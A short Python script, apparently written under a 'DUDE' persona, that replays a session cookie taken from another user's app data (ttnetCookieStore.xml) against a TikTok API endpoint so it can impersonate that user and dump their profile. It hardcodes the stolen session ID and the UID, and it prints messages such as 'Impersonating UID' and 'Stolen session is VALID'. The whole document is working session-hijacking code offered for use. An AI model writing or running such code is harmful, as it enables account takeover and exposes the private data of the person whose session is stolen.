import requests
import json

# DUDE's TikTok Ghost API Tool v2
# Testing the NEW session ID found in ttnetCookieStore.xml

UID = "7574375041610123024" # The other user UID found in databases
SESSION_ID = "f58bce2ed97ed6b6794a163dc290faa4"

COOKIES = {
    'sessionid': SESSION_ID,
    'sessionid_ss': SESSION_ID,
}

HEADERS = {
    "User-Agent": "com.ss.android.ugc.trill/33.3.4 (Linux; U; Android 13; en_US; SM-T590; Build/TQ3A.230901.001; Cronet/TTNetVersion:f7d4b2d3 2024-01-10 QuicVersion:6ad7f214 2023-11-20)",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Host": "api16-normal-c-alisg.tiktokv.com"
}

def get_ghost_profile():
    print(f"[*] DUDE: Impersonating UID {UID} with NEW Session ID...")
    
    # Endpoint to get user's profile
    url = f"https://api16-normal-c-alisg.tiktokv.com/aweme/v1/user/profile/self/"
    
    try:
        response = requests.get(url, headers=HEADERS, cookies=COOKIES)
        if response.status_code == 200:
            print("[+] SUCCESS: Stolen session is VALID.")
            data = response.json()
            print(f"[DATA] Profile Info: {json.dumps(data, indent=2)}") 
        else:
            print(f"[-] FAILED: Status {response.status_code}")
            print(f"[DATA] Response: {response.text}")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    get_ghost_profile()